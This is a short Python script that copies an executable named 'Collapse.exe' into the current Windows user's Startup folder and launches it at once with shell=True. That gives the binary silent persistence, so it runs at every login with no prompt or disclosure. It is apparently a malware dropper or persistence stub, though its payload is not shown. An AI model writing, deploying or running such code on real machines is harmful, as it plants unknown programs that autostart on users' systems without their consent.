import os
import shutil
import subprocess

user = os.environ['USERNAME']
src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Collapse.exe")
dst = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Collapse.exe"

if os.path.exists(src):
    shutil.copy2(src, dst)
    subprocess.Popen([dst], shell=True)